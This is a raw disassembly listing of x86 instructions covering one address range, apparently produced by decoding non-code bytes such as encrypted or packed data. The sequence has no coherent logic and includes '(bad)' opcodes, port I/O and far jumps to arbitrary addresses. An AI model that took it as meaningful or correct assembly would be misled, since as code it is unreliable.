  409d08:	dec    esi
  409d09:	fldenv [ecx]
  409d0b:	pop    esi
  409d0c:	gs retf 
  409d0e:	push   ds
  409d0f:	xlat   BYTE PTR ds:[ebx]
  409d10:	pop    ds
  409d11:	mov    dh,0x91
  409d13:	mov    cl,0xb6
  409d15:	jmp    0x409d02
  409d17:	mov    cl,0x5a
  409d19:	or     eax,0xb8efd400
  409d1e:	mov    ebx,0xba53c1d5
  409d23:	ins    DWORD PTR es:[edi],dx
  409d24:	jle    0x409d0b
  409d26:	jge    0x409d2c
  409d28:	push   edx
  409d29:	push   0xfffffffc
  409d2b:	inc    esi
  409d2c:	adc    DWORD PTR [eax],ecx
  409d2e:	add    BYTE PTR ds:0xa108ff11,bh
  409d34:	mov    cl,0x7
  409d36:	je     0x409dad
  409d38:	jmp    0xfecddf7d
  409d3d:	xchg   ebp,eax
  409d3e:	xlat   BYTE PTR ds:[ebx]
  409d3f:	in     eax,0x2c
  409d41:	into   
  409d42:	pop    edx
  409d43:	mov    al,BYTE PTR [eax+edi*1+0x6b709c82]
  409d4a:	jno    0x409d9e
  409d4c:	push   edi
  409d4d:	out    0xdb,eax
  409d4f:	adc    al,0x51
  409d51:	pop    esi
  409d52:	stos   BYTE PTR es:[edi],al
  409d53:	adc    eax,0x7ac8ad2a
  409d58:	xor    ch,0x2
  409d5b:	fdivrp st(4),st
  409d5d:	mov    al,ds:0x106d15d4
  409d62:	inc    ebx
  409d63:	retf   
  409d64:	ds stc 
  409d66:	dec    ecx
  409d67:	xchg   DWORD PTR [ecx],edi
  409d69:	and    DWORD PTR [edx-0x141a47af],esi
  409d6f:	(bad)  
  409d71:	xor    esi,esp
  409d73:	mov    al,dl
  409d75:	lds    ecx,FWORD PTR [edi+0x56083280]
  409d7b:	fmul   QWORD PTR [ecx+0x57e779dd]
  409d81:	or     edx,DWORD PTR [esi+ecx*8+0x1d02297f]
  409d88:	std    
  409d89:	mov    dl,0x68
  409d8b:	shl    BYTE PTR [ebp-0x4c],1
  409d8e:	(bad)  
  409d8f:	lea    ebp,[ebx-0x49]
  409d92:	jbe    0x409d2d
  409d94:	mov    al,ds:0xefb069bc
  409d99:	or     BYTE PTR [ebx+ebx*8+0x3],al
  409d9d:	inc    esp
  409d9e:	xchg   ebp,eax
  409d9f:	shl    DWORD PTR [edi-0x47],0x43
  409da3:	sub    esp,ebp
  409da5:	sub    al,0xc8
  409da7:	fmul   QWORD PTR [edx-0x75]
  409daa:	out    dx,al
  409dab:	add    al,0x16
  409dad:	xchg   BYTE PTR [esi-0x6d77ed49],cl
  409db3:	push   ss
  409db4:	push   es
  409db5:	pop    DWORD PTR [eax-0x5f6949f9]
  409dbb:	mov    ecx,0x584e5741
  409dc0:	add    DWORD PTR [ebx],edx
  409dc2:	call   0xe367:0xbf28a739
  409dc9:	cmp    al,0x20
  409dcb:	and    eax,0x6bb3668d
  409dd0:	xor    edi,edi
  409dd2:	xchg   edx,eax
  409dd3:	mov    edx,0x4e92eec1
  409dd8:	jmp    0xd5:0x5420033f
  409ddf:	inc    esi
  409de0:	and    bh,BYTE PTR [edi+0x464505cb]
  409de6:	dec    edx
  409de7:	xor    DWORD PTR [edx],eax
  409de9:	repnz and al,0x59
  409dec:	pusha  
  409ded:	inc    ecx
  409dee:	sti    
  409def:	fmul   DWORD PTR [ecx-0x38]
  409df2:	adc    eax,0x94a4178
  409df7:	inc    eax
  409df8:	fisubr WORD PTR [edi+edx*8]
  409dfb:	ins    BYTE PTR es:[edi],dx
  409dfc:	jnp    0x409e70
  409dfe:	mov    ah,0xd0
  409e00:	lods   eax,DWORD PTR ds:[esi]
  409e01:	or     DWORD PTR [edi+ebp*2],esp
  409e04:	jmp    0x409dbf
  409e06:	rcr    DWORD PTR [edx+0x5403dfaf],1
  409e0c:	in     al,dx
  409e0d:	icebp  
  409e0e:	jl     0x409e60
  409e10:	mov    eax,ds:0x5a2196d6
  409e15:	retf   0x5e1c
  409e18:	push   DWORD PTR [edi+0x36c2ec27]
  409e1e:	xor    edx,DWORD PTR [esi+0x31a15fc5]
  409e24:	icebp  
  409e25:	inc    edi
  409e26:	sbb    ecx,DWORD PTR [ebx-0x18ee23e4]
  409e2c:	jl     0x409e7b
  409e2e:	add    eax,eax
  409e30:	mov    eax,0x54696784
  409e35:	push   edi
  409e36:	imul   esp,DWORD PTR [esi],0xffffffdd
  409e39:	inc    edi
  409e3a:	adc    cl,BYTE PTR [eax]
  409e3c:	imul   ebp,DWORD PTR [edi+0x602fa591],0x44
  409e43:	xor    al,0x61
  409e45:	push   0x422c65f1
  409e4a:	mov    bl,BYTE PTR ds:0x33db60f5
  409e50:	cwde   
  409e51:	xchg   edi,eax
  409e52:	ficom  WORD PTR [edi+0x41607a28]
  409e58:	mov    bh,0xf1
  409e5a:	int3   
  409e5b:	xlat   BYTE PTR ds:[ebx]
  409e5c:	cmp    DWORD PTR [esi-0x49],0x25
  409e60:	jae    0x409e42
  409e62:	sbb    DWORD PTR [edi-0x3e84f547],0x26916d12
  409e6c:	mov    ecx,0xba6e4daa
  409e71:	add    al,cl
  409e73:	xchg   ebx,eax
  409e74:	and    ecx,DWORD PTR [ebx]
  409e76:	xor    al,BYTE PTR [ebp+0x8014563]
  409e7c:	clc    
  409e7d:	lods   al,BYTE PTR ds:[esi]
  409e7e:	and    BYTE PTR [esi-0x4d9157b0],ch
  409e84:	in     eax,0x8a
  409e86:	lahf   
  409e87:	dec    eax
  409e88:	jns    0x409e4f
  409e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8b:	mov    edx,0x2fd7349c
  409e90:	idiv   BYTE PTR [ecx-0x2c]
  409e93:	pop    edx
  409e94:	fs mov esp,0x438e92c4
  409e9a:	leave  
  409e9b:	popa   
  409e9c:	pop    edx
  409e9d:	adc    ebp,DWORD PTR [esi+0x4764094e]
  409ea3:	stos   BYTE PTR es:[edi],al
  409ea4:	lock stos DWORD PTR es:[edi],eax
  409ea6:	or     eax,0xb97b1eaa
  409eab:	fsub   DWORD PTR [edi-0x23641fb1]
  409eb1:	jl     0x409ec3
  409eb3:	outs   dx,DWORD PTR ds:[esi]
  409eb4:	stc    
  409eb5:	out    dx,al
  409eb6:	cmp    al,0x81
  409eb8:	and    DWORD PTR [eax],0xafb8482a
  409ebe:	xor    BYTE PTR [edx+0x59],bh
  409ec1:	clc    
  409ec2:	mov    DWORD PTR [ebx],ebp
  409ec4:	test   al,0xfb
  409ec6:	or     bl,BYTE PTR [ecx+0x57]
  409ec9:	cli    
  409eca:	or     bl,ah
  409ecc:	(bad)  
  409ecd:	mov    ch,BYTE PTR [esi]
  409ecf:	aam    0x85
  409ed1:	cli    
  409ed2:	push   esp
  409ed3:	xchg   ecx,eax
  409ed4:	pop    es
  409ed5:	push   ds
  409ed6:	cmp    eax,0x369b4984
  409edb:	pop    esi
  409edc:	fs push es
  409ede:	test   al,0x60
  409ee0:	mov    eax,ds:0x6b03e82
  409ee5:	sbb    dh,dh
  409ee7:	or     DWORD PTR [ebx+0x21],edi
  409eea:	add    al,0x27
  409eec:	mov    dh,0xa1
  409eef:	fidivr WORD PTR [ecx-0xd]
  409ef2:	xor    DWORD PTR [ecx],eax
  409ef4:	sbb    bl,ah
  409ef6:	cmp    ebx,DWORD PTR [esi-0x52]
  409ef9:	mov    bl,0x44
  409efb:	test   ch,ch
  409efd:	sbb    eax,0x7e829a80
  409f02:	inc    ebx
  409f03:	mov    esp,0x62e3dc72
  409f08:	pop    eax
  409f09:	out    0x1f,al
  409f0b:	scas   eax,DWORD PTR es:[edi]
  409f0c:	dec    esp
  409f0d:	imul   esi,DWORD PTR [eax],0xb6dbe83d
  409f13:	push   ds
  409f14:	aaa    
  409f15:	cli    
  409f16:	mov    bh,0x49
  409f18:	fmul   QWORD PTR [eax]
  409f1a:	push   ecx
  409f1b:	call   0x7f9c:0x7432a170
  409f22:	push   cs
  409f23:	xchg   ebp,eax
  409f24:	mov    ?,WORD PTR [ebx+0x19]
  409f27:	cmp    DWORD PTR [esi+0x2ec2ba22],edi
  409f2d:	mov    al,0xb7
  409f2f:	call   0xad8481e2
  409f34:	inc    eax
  409f35:	int    0x6a
  409f37:	add    ecx,ebp
  409f39:	fdivp  st(0),st
  409f3b:	or     al,0x95
  409f3d:	sub    al,0xb
  409f3f:	jmp    0xdd970d3
  409f44:	scas   al,BYTE PTR es:[edi]
  409f45:	sbb    ch,bl
  409f47:	add    ch,BYTE PTR [ebx+0x23]
  409f4a:	push   edi
  409f4b:	aam    0xec
  409f4d:	cmc    
  409f4e:	les    edx,FWORD PTR [edx-0x5]
  409f51:	and    bl,BYTE PTR [ebx+ebx*2-0x74]
  409f55:	adc    bh,ch
  409f57:	in     eax,dx
  409f58:	push   es
  409f59:	arpl   WORD PTR [esi-0x5ba5884f],dx
  409f5f:	adc    BYTE PTR ds:0xb16365b5,dl
  409f65:	popa   
  409f66:	adc    edx,DWORD PTR [ebx+0x3d034f54]
  409f6c:	or     al,0xc3
  409f6e:	dec    ecx
  409f6f:	inc    eax
  409f70:	dec    eax
  409f71:	test   BYTE PTR [ecx],dh
  409f73:	dec    edx
  409f74:	dec    ebx
  409f75:	jmp    0xf9d9:0x8438668e
  409f7c:	mov    ah,bl
  409f7e:	jns    0x409f7d
  409f80:	pop    esi
  409f81:	cwde   
  409f82:	dec    eax
  409f83:	outs   dx,BYTE PTR ds:[esi]
  409f84:	cld    
  409f85:	push   ebp
  409f86:	xlat   BYTE PTR ds:[ebx]
  409f87:	jg     0x409f61
  409f89:	dec    ecx
  409f8a:	ins    BYTE PTR es:[edi],dx
  409f8b:	mov    ds:0x6e0f7365,eax
  409f90:	add    eax,0x390adc7d
  409f95:	outs   dx,BYTE PTR ds:[esi]
  409f96:	scas   al,BYTE PTR es:[edi]
  409f97:	or     edi,DWORD PTR [esi-0x2498da26]
  409f9d:	icebp  
  409f9e:	dec    esp
  409f9f:	ins    DWORD PTR es:[edi],dx
  409fa0:	fistp  QWORD PTR [eax]
  409fa2:	repz dec esp
  409fa4:	rol    BYTE PTR [ecx],cl
  409fa6:	push   ebx
  409fa7:	iret   
  409fa8:	retf   0xeb16
  409fab:	aam    0x6f
  409fad:	pop    ebx
  409fae:	fstp   QWORD PTR [edi+edx*4]
  409fb1:	or     DWORD PTR ss:[ebx*4-0x5d77ac34],esi
  409fb9:	adc    DWORD PTR [esi+0x6c],0xcb92fb2a
  409fc0:	aas    
  409fc1:	ins    BYTE PTR es:[edi],dx
  409fc2:	jae    0x409fd4
  409fc4:	jle    0x409fe0
  409fc6:	leave  
  409fc7:	faddp  st(3),st
  409fc9:	push   ss
  409fca:	mov    bl,0xb8
  409fcc:	pop    ebp
  409fcd:	jo     0x409fcc
  409fcf:	jmp    0x409fbf
  409fd1:	enter  0x5a05,0xce
  409fd5:	pop    ds
  409fd6:	jmp    0xd9aa6bff
  409fdb:	dec    edx
  409fdc:	hlt    
  409fdd:	test   eax,0xc08202ca
  409fe2:	or     ecx,DWORD PTR [ebx]
  409fe4:	ja     0x40a041
  409fe6:	adc    eax,0x6be70163
  409feb:	call   0xf7db:0x36bd8e9b
  409ff2:	and    eax,0xeeaa2eae
  409ff7:	out    0x67,eax
  409ff9:	lods   eax,DWORD PTR ds:[esi]
  409ffa:	jns    0x40a025
  409ffc:	addr16 je 0x40a024
  409fff:	jo     0x409fb6
  40a001:	sub    al,0x1b
  40a003:	fstp   TBYTE PTR ds:0xb46908e5
  40a009:	and    ebp,DWORD PTR [edi+0x10e8d513]
  40a00f:	push   DWORD PTR [eax+0x36]
  40a012:	call   0x37f54718
  40a017:	mov    ecx,0x9682441
  40a01d:	pop    eax
  40a01e:	adc    eax,0xe6e42e28
  40a023:	test   DWORD PTR [edi-0xdd04024],0xd91cf15
  40a02d:	jmp    0xf6ad:0x6d188dbe
  40a034:	pop    ds
  40a035:	push   edx
  40a036:	stos   DWORD PTR es:[edi],eax
  40a037:	dec    esi
  40a038:	mov    cl,0x33
  40a03a:	(bad)  
  40a03b:	arpl   WORD PTR [edx+eax*4+0x6a],bp
  40a03f:	sub    edi,DWORD PTR [edi]
  40a041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a042:	div    edx
  40a044:	imul   ebp
  40a046:	and    BYTE PTR [edi-0x50],dl
  40a049:	push   0xffffff96
  40a04b:	repnz xor DWORD PTR [ecx-0x3],ebp
  40a04f:	sub    eax,0xa2ae5115
  40a054:	xor    cl,ch
  40a056:	cdq    
  40a057:	enter  0x87,0xd3
  40a05b:	(bad)  
  40a05c:	push   ecx
  40a05d:	enter  0x5bcc,0x1f
  40a061:	pop    ss
  40a062:	and    al,0x24
  40a064:	(bad)  
  40a065:	mov    ds:0x7ea35ab7,eax
  40a06a:	mov    eax,ds:0x3cdd88e6
  40a06f:	mov    al,0xc5
  40a071:	lahf   
  40a072:	sub    BYTE PTR [ecx+0x35],bh
  40a075:	mov    edi,0xe461c1a4
  40a07a:	mov    ecx,0x11542a25
  40a07f:	mov    edx,0xe5ea62eb
  40a084:	and    al,0x6d
  40a086:	ror    esi,cl
  40a088:	push   esp
  40a089:	fistp  DWORD PTR [ecx]
  40a08b:	sahf   
  40a08c:	dec    eax
  40a08d:	mov    al,ds:0xc9a3d25f
  40a092:	aas    
  40a093:	cmp    ah,BYTE PTR [ebx]
  40a095:	pop    edi
  40a096:	push   ds
  40a097:	dec    edx
  40a098:	loop   0x40a0bd
  40a09a:	jle    0x40a08a
  40a09c:	mov    ds:0xf4eb303b,al
  40a0a1:	js     0x40a0f5
  40a0a3:	mov    ch,0x82
  40a0a5:	icebp  
  40a0a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0a7:	inc    esp
  40a0a8:	fstp   TBYTE PTR [eax+0x335b7d14]
  40a0ae:	pushf  
  40a0af:	xchg   esp,eax
  40a0b0:	adc    bl,BYTE PTR [esp+eiz*4]
  40a0b3:	inc    edi
  40a0b4:	in     al,0xce
  40a0b6:	cdq    
  40a0b7:	iret   
  40a0b8:	leave  
  40a0b9:	jbe    0x40a047
  40a0bb:	push   ebx
  40a0bc:	adc    ah,bl
  40a0be:	jecxz  0x40a0fd
  40a0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0c1:	fdivp  st(1),st
  40a0c3:	icebp  
  40a0c4:	out    0x50,al
  40a0c6:	xlat   BYTE PTR ds:[ebx]
  40a0c7:	pop    ebx
  40a0c8:	jmp    0x40a0c0
  40a0ca:	(bad)  
  40a0cb:	call   0xf5ed34e8
  40a0d0:	dec    edx
  40a0d1:	push   ebp
  40a0d2:	adc    DWORD PTR ds:0xa668181c,esp
  40a0d8:	addr16 int3 
  40a0da:	jns    0x40a0f7
  40a0dc:	or     eax,edi
  40a0de:	mov    ecx,0x9687684f
  40a0e3:	xchg   ecx,eax
  40a0e4:	and    al,0xbf
  40a0e6:	(bad)  
  40a0e7:	pop    edx
  40a0e8:	fimul  DWORD PTR [edx]
  40a0ea:	fcmovnu st,st(0)
  40a0ec:	xlat   BYTE PTR ds:[ebx]
  40a0ed:	not    DWORD PTR [esp+eiz*8+0x2e]
  40a0f1:	std    
  40a0f2:	call   0x91967799
  40a0f7:	int    0x84
  40a0f9:	(bad)  
  40a0fa:	int    0xe
  40a0fc:	dec    eax
  40a0fd:	mov    bh,0x72
  40a0ff:	add    al,BYTE PTR [ebp+0x27]
  40a102:	loop   0x40a14c
  40a104:	mov    ecx,0xc9b0115d
  40a109:	shl    DWORD PTR [ebx+0x2f],cl
  40a10c:	jecxz  0x40a097
  40a10e:	push   edx
  40a10f:	push   0xe
  40a111:	sbb    eax,0x6533f8d2
  40a116:	mov    bl,0xcc
  40a118:	jb     0x40a193
  40a11a:	add    bh,ch
  40a11c:	sub    eax,0xe4ae2a9c
  40a121:	dec    BYTE PTR [esi+0x66ae935b]
  40a127:	push   esp
  40a128:	jp     0x40a0ff
  40a12a:	cmp    DWORD PTR [edi+0x2b9c3af5],ebx
  40a130:	stos   DWORD PTR es:[edi],eax
  40a131:	add    bh,0x80
  40a134:	rcr    BYTE PTR [ebx+0x5d],0x5e
  40a138:	(bad)  
  40a139:	lock mov WORD PTR [ecx-0x7a],ss
  40a13d:	pop    es
  40a13e:	ins    DWORD PTR es:[edi],dx
  40a13f:	cmp    al,0xcb
  40a141:	pop    es
  40a142:	jl     0x40a1af
  40a144:	xchg   esp,eax
  40a145:	or     eax,0xb65eb183
  40a14a:	outs   dx,BYTE PTR ds:[esi]
  40a14b:	push   edx
  40a14c:	or     BYTE PTR [esi],ah
  40a14e:	jo     0x40a1c1
  40a150:	pop    es
  40a151:	shl    BYTE PTR [eax+0x2e],cl
  40a154:	add    eax,0x234b22be
  40a159:	bnd js 0x40a18f
  40a15c:	sub    DWORD PTR [ebx],edx
  40a15e:	and    eax,0x73c7f85e
  40a163:	mov    edi,0x759b9092
  40a168:	jl     0x40a188
  40a16a:	rcr    DWORD PTR [edi],0xf7
  40a16d:	inc    edi
  40a16e:	pop    ds
  40a16f:	pop    es
  40a170:	in     eax,dx
  40a171:	out    0x94,eax
  40a173:	mov    bl,0x63
  40a175:	sub    al,0x43
  40a177:	sti    
  40a178:	jae    0x40a157
  40a17a:	xchg   BYTE PTR [ebx],al
  40a17c:	inc    esp
  40a17d:	lahf   
  40a17e:	lahf   
  40a17f:	(bad)
  40a182:	sti    
  40a183:	(bad)  
  40a184:	and    eax,DWORD PTR [ebx+0x4571e899]
  40a18a:	out    0x4f,al
  40a18c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a18d:	mov    eax,0x8ca5c206
  40a192:	xchg   esp,eax
  40a193:	mov    BYTE PTR [edi],dh
  40a195:	loope  0x40a142
  40a197:	inc    esp
  40a198:	jb     0x40a154
  40a19a:	cmp    dl,BYTE PTR [eax-0x326739c]
  40a1a0:	gs cs inc edx
  40a1a3:	ficomp WORD PTR [ebx]
  40a1a5:	int3   
  40a1a6:	bound  edx,QWORD PTR [ebx+0x378b1849]
  40a1ac:	stos   DWORD PTR es:[edi],eax
  40a1ad:	popf   
  40a1ae:	xchg   esi,eax
  40a1af:	push   ecx
  40a1b0:	int    0xbf
  40a1b2:	rcl    BYTE PTR [eax+0x76b363f0],0xfa
  40a1b9:	mov    cl,0xe1
  40a1bb:	(bad)  
  40a1bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1bd:	fwait
  40a1be:	inc    ebx
  40a1bf:	iret   
  40a1c0:	push   esp
  40a1c1:	mov    ds:0x98f4ebfe,eax
  40a1c6:	add    cl,BYTE PTR [eax]
  40a1c8:	push   ebp
  40a1c9:	fucom  st(6)
  40a1cb:	cmp    eax,0xcd46647b
  40a1d0:	jecxz  0x40a21f
  40a1d2:	push   edi
  40a1d3:	dec    dh
  40a1d5:	adc    DWORD PTR [eax+0x464e89b2],0x3c9f218f
  40a1df:	repnz out dx,al
  40a1e1:	(bad)  
  40a1e2:	mov    dh,0xce
  40a1e4:	jno    0x40a202
  40a1e6:	lock stos DWORD PTR es:[edi],eax
  40a1e8:	mov    dh,0x3d
  40a1ea:	cmp    BYTE PTR [ebp+0x3e],0x68
  40a1ee:	pop    edx
  40a1ef:	mov    cl,0x82
  40a1f1:	pusha  
  40a1f2:	in     eax,dx
  40a1f3:	inc    edi
  40a1f4:	and    ecx,esp
  40a1f6:	arpl   dx,bp
  40a1f8:	das    
  40a1f9:	inc    ecx
  40a1fa:	lds    ebp,FWORD PTR [esi+0x1ad838c0]
  40a200:	mov    ds:0xf7e9810f,eax
  40a205:	arpl   WORD PTR [eax],ax
  40a207:	sbb    BYTE PTR [edi],bl
  40a209:	retf   
  40a20a:	lea    edi,[edx-0x4c]
  40a20d:	and    eax,0xbbe52d33
  40a212:	stos   BYTE PTR es:[edi],al
  40a213:	ret    0xc49
  40a216:	popf   
  40a217:	inc    eax
  40a218:	cli    
  40a219:	cmp    al,0x4f
  40a21b:	es sbb ebx,0xe367a3b0
  40a222:	pushf  
  40a223:	nop
  40a224:	xor    eax,0x67d2b0f2
  40a229:	and    DWORD PTR [eax-0x7c],ebp
  40a22c:	mov    es,WORD PTR [ebx]
  40a22e:	inc    ebp
  40a22f:	jmp    0x4ddf2581
  40a234:	into   
  40a235:	ret    
  40a236:	retf   
  40a237:	dec    esp
  40a238:	fstp   DWORD PTR [ecx]
  40a23a:	repz mov dh,0x4c
  40a23d:	aaa    
  40a23e:	inc    esi
  40a23f:	and    al,0xda
  40a241:	out    dx,eax
  40a242:	xor    edi,DWORD PTR [edi]
  40a244:	fs inc ecx
  40a246:	xor    al,0x4d
  40a248:	gs push esp
  40a24a:	fld    DWORD PTR [ebx]
  40a24c:	inc    edx
  40a24d:	data16 mov bh,0x6a
  40a250:	int    0x8
  40a252:	mov    al,0x14
  40a254:	test   BYTE PTR [eax-0x68],bl
  40a257:	lea    ebp,[edx+edx*2+0x63e19063]
  40a25e:	pop    eax
  40a25f:	jne    0x40a1ed
  40a261:	and    edi,DWORD PTR [edx+0x67]
  40a264:	pop    ds
  40a265:	(bad)  
  40a266:	mul    DWORD PTR ds:0xbc24aac
  40a26c:	jecxz  0x40a224
  40a26e:	sub    bl,0x7f
  40a271:	in     al,dx
  40a272:	ja     0x40a2ef
  40a274:	aaa    
  40a275:	jmp    0x3e151d4f
  40a27a:	sbb    DWORD PTR [edx-0x69],esi
  40a27d:	jbe    0x40a2b2
  40a27f:	adc    eax,0x86437f5a
  40a284:	pop    ds
  40a285:	cmp    DWORD PTR [ebp+0x4481f9ac],0x170c2775
  40a28f:	cmp    edx,edi
  40a291:	push   ebp
  40a292:	cs pop esp
  40a294:	push   0x2f
  40a296:	adc    edx,DWORD PTR [esi]
  40a298:	or     eax,0xf5a77911
  40a29d:	stos   BYTE PTR es:[edi],al
  40a29e:	jmp    0x2eed:0x898553e
  40a2a5:	dec    ebx
  40a2a6:	aam    0xc3
  40a2a8:	add    eax,0xcbca12c3
  40a2ad:	mov    edi,DWORD PTR [edi-0x4a1c661c]
  40a2b3:	and    eax,0x9498533a
  40a2b8:	out    0x21,eax
  40a2ba:	stc    
  40a2bb:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40a2bd:	fiadd  WORD PTR [esi+esi*8-0x10]
  40a2c1:	sbb    dh,bh
  40a2c3:	call   0xef01184c
  40a2c8:	pop    ds
  40a2c9:	in     eax,dx
  40a2ca:	popa   
  40a2cb:	das    
  40a2cc:	inc    edi
  40a2cd:	mov    edx,0xe3246cee
  40a2d2:	jne    0x40a29c
  40a2d4:	push   0xffffff9a
  40a2d6:	cli    
  40a2d7:	mov    DWORD PTR [edi+eax*2],eax
  40a2da:	xchg   esp,eax
  40a2db:	call   0x5b4751a6
  40a2e0:	dec    esi
  40a2e1:	and    edi,DWORD PTR [eax]
  40a2e3:	xor    eax,0xbfb37a5e
  40a2e8:	cdq    
  40a2e9:	dec    ebx
  40a2ea:	push   0x5447a78
  40a2ef:	je     0x40a290
  40a2f1:	mov    dh,0x5
  40a2f3:	fcom   DWORD PTR [ecx]
  40a2f5:	jns    0x40a2b3
  40a2f7:	fnstenv [esi-0x47]
  40a2fa:	dec    eax
  40a2fb:	bnd jns 0x40a2b2
  40a2fe:	mov    esi,0x71f1118c
  40a303:	mov    DWORD PTR [esi],edx
  40a305:	mov    al,0xc3
  40a307:	adc    BYTE PTR [edi],0xac
  40a30a:	sub    BYTE PTR [edx-0xa],0x77
  40a30e:	adc    al,BYTE PTR [ecx-0x55b3bc61]
  40a314:	int3   
  40a315:	shl    edi,1
  40a317:	out    0x33,al
  40a319:	scas   al,BYTE PTR es:[edi]
  40a31a:	pushf  
  40a31b:	les    edi,FWORD PTR [edi+0x30]
  40a31e:	ffree  st(1)
  40a320:	inc    edi
  40a321:	or     DWORD PTR [esi],ebp
  40a323:	mov    ah,0xde
  40a325:	cli    
  40a326:	inc    ebx
  40a327:	fistp  DWORD PTR [eax]
  40a329:	adc    DWORD PTR [ebp+0x71],0xf31bcee8
  40a330:	jle    0x40a378
  40a332:	test   ebp,ebx
  40a334:	and    edx,esi
  40a336:	dec    edi
  40a337:	xchg   ebx,eax
  40a338:	xchg   ecx,eax
  40a339:	fld    QWORD PTR [esi-0x30]
  40a33c:	scas   eax,DWORD PTR es:[edi]
  40a33d:	jne    0x40a340
  40a33f:	into   
  40a340:	jmp    0x6129dfc0
  40a345:	push   0xf4d77656
  40a34a:	dec    ecx
  40a34b:	imul   ebp,DWORD PTR [edi+0x10],0xffffff84
  40a34f:	mov    ebp,0x1f1e48c3
  40a354:	dec    edi
  40a355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a356:	jo     0x40a308
  40a358:	shl    BYTE PTR [edi+0x5f820a59],1
  40a35e:	xchg   ecx,eax
  40a35f:	dec    esp
  40a360:	xchg   ecx,eax
  40a361:	cmc    
  40a362:	icebp  
  40a363:	ret    
  40a364:	sub    eax,DWORD PTR [edx-0xb]
  40a367:	int3   
  40a368:	add    al,0xfc
  40a36a:	push   cs
  40a36b:	mov    ecx,0xbb3bcef8
  40a370:	cmp    DWORD PTR [ebx+0x70602f9d],edi
  40a376:	sub    edx,ecx
  40a378:	nop
  40a379:	mov    ecx,0xfa6b9b64
  40a37e:	int3   
  40a37f:	sti    
  40a380:	mov    WORD PTR [esi-0x5a36b95a],ds
  40a386:	ret    
  40a387:	not    esp
  40a389:	mov    bl,0xfe
  40a38b:	pop    eax
  40a38c:	out    0xfd,eax
  40a38e:	popf   
  40a38f:	jb     0x40a338
  40a391:	cmp    eax,0x8ae25192
  40a396:	xchg   cl,cl
  40a398:	or     al,0x4d
  40a39a:	jae    0x40a322
  40a39c:	pop    esi
  40a39d:	sbb    edi,esi
  40a39f:	add    ch,dh
  40a3a1:	out    0x7f,al
  40a3a3:	sub    BYTE PTR [edx+eiz*1-0x26],dl
  40a3a7:	mov    WORD PTR [ecx],gs
  40a3a9:	aas    
  40a3aa:	(bad)  
  40a3ab:	sub    eax,0x7492f568
  40a3b0:	inc    edi
  40a3b1:	mov    dl,0x8
  40a3b3:	adc    esi,edx
  40a3b5:	jle    0x40a3da
  40a3b7:	push   ss
  40a3b8:	pop    esi
  40a3b9:	into   
  40a3ba:	adc    BYTE PTR [ebx+0x65],0xe8
  40a3be:	or     edx,esi
  40a3c0:	sbb    esp,DWORD PTR [edx+0x2f]
  40a3c3:	jb     0x40a3ed
  40a3c5:	in     al,dx
  40a3c6:	pusha  
  40a3c7:	pushf  
  40a3c8:	aam    0x1f
  40a3ca:	(bad)
  40a3cd:	ds pusha 
  40a3cf:	les    edi,FWORD PTR ds:0xfd723358
  40a3d5:	mov    DWORD PTR [edx+0x1cb1cec7],ecx
  40a3db:	cmp    BYTE PTR [esi-0x901f060],al
  40a3e1:	mov    ecx,0x13557591
  40a3e6:	in     eax,0x7c
  40a3e8:	mov    ah,0x1f
  40a3ea:	mov    al,ds:0x81d984dd
  40a3ef:	shr    dl,1
  40a3f1:	mov    ds,WORD PTR [edx]
  40a3f3:	add    al,0x89
  40a3f5:	pop    es
  40a3f6:	sub    eax,0x2e6bef61
  40a3fb:	pop    ebx
  40a3fc:	pop    ss
  40a3fd:	ja     0x40a3f4
  40a3ff:	sub    DWORD PTR [edx-0x66350bbb],ecx
  40a405:	cli    
  40a406:	pop    ss
  40a407:	add    al,0x63
  40a409:	cwde   
  40a40a:	lea    ebp,[ecx+0x5e68f8df]
  40a410:	das    
  40a411:	test   al,ah
  40a413:	mov    ss,esp
  40a415:	adc    DWORD PTR [edi+0x5cb81331],esp
  40a41b:	sub    BYTE PTR [esp+ebp*4+0x4b],0x2f
  40a420:	dec    ebx
  40a421:	das    
  40a422:	bound  ecx,QWORD PTR ds:0xc51d247
  40a428:	inc    esp
  40a429:	mov    ebx,0x3089227e
  40a42e:	mov    eax,ds:0x4a3721f3
  40a433:	pushf  
  40a434:	xchg   BYTE PTR [ebp+0x2f],dl
  40a437:	in     al,0x8f
  40a439:	shr    BYTE PTR [ebp+0x2e398671],cl
  40a43f:	adc    DWORD PTR [edi-0x3b],esp
  40a442:	mov    eax,ds:0xa13f8ff6
  40a447:	sti    
  40a448:	xor    esp,eax
  40a44a:	sbb    eax,0xce3add72
  40a44f:	adc    ebx,edx
  40a451:	xchg   al,al
  40a453:	sbb    BYTE PTR [edi],0x19
  40a456:	jg     0x40a3e9
  40a458:	mov    ds,WORD PTR [ebp-0x19]
  40a45b:	call   0x44b1:0xe2ab9e4c
  40a462:	popf   
  40a463:	into   
  40a464:	cmp    dh,BYTE PTR [eax]
  40a466:	cmp    dl,cl
  40a468:	add    ebx,DWORD PTR [esi-0x78]
  40a46b:	mov    dh,0x60
  40a46d:	jb     0x40a406
  40a46f:	mov    bh,0x96
  40a471:	clc    
  40a472:	out    dx,eax
  40a473:	test   BYTE PTR [ebp+0xb7bc07e],bl
  40a479:	dec    ecx
  40a47a:	jae    0x40a49a
  40a47c:	sar    DWORD PTR [ebx-0x3c],1
  40a47f:	aaa    
  40a480:	jb     0x40a492
  40a482:	cwde   
  40a483:	out    0x28,eax
  40a485:	push   ss
  40a486:	sar    DWORD PTR [edx-0x6e26e54],0x27
  40a48d:	test   DWORD PTR [edx+0x2f],0xe87519a9
  40a494:	ret    
  40a495:	sbb    esi,ecx
  40a497:	imul   DWORD PTR [eax+0x36]
  40a49a:	cmp    esp,DWORD PTR [edi+ebx*2+0x7b03640a]
  40a4a1:	fnstenv [ecx+edi*1]
  40a4a4:	mov    dh,0x3
  40a4a6:	fisttp DWORD PTR [edi-0x7b2fe0ff]
  40a4ac:	hlt    
  40a4ad:	mov    al,BYTE PTR [ebp+ebx*1-0x6b52a3dd]
  40a4b4:	adc    eax,0xfb47da06
  40a4b9:	mov    cl,0x9e
